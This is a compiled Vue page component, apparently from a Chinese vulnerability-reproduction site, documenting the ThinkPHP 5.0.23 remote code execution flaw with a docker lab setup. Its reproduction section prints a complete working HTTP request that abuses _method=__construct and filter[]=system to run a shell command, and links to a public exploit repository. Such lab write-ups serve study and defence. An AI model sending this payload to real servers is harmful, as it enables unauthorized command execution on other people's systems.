import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as d,o as r,c as s,a as e,b as n,d as a,e as o}from"./app-58e4a7d6.js";const c={},l=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),p=e("p",null,"ThinkPHP 是一款运用极广的 PHP 开发框架。其 5.0.23 以前的版本中，获取 method 的方法中没有正确处理方法名，导致攻击者可以调用 Request 类任意方法并构造利用链，从而导致远程代码执行漏洞。",-1),h=e("p",null,"参考链接：",-1),u={href:"https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003",target:"_blank",rel:"noopener noreferrer"},m=o(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>执行如下命令启动一个默认的 thinkphp 5.0.23 环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问 <code>http://your-ip:8080/index.php</code> 即可看到默认的 ThinkPHP 启动页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>发送数据包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /index.php?s=captcha HTTP/1.1
Host: your-vps-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>成功执行 <code>id</code> 命令：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021515902.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="开源-poc-exp" tabindex="-1"><a class="header-anchor" href="#开源-poc-exp" aria-hidden="true">#</a> 开源 POC/EXP</h2>`,10),_={href:"https://github.com/sukabuliet/ThinkphpRCE",target:"_blank",rel:"noopener noreferrer"};function b(v,f){const i=d("ExternalLinkIcon");return r(),s("div",null,[l,p,h,e("ul",null,[e("li",null,[e("a",u,[n("https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003"),a(i)])])]),m,e("ul",null,[e("li",null,[e("a",_,[n("https://github.com/sukabuliet/ThinkphpRCE"),a(i)])])])])}const k=t(c,[["render",b],["__file","ThinkPHP5 5.0.23 远程代码执行漏洞.html.vue"]]);export{k as default};
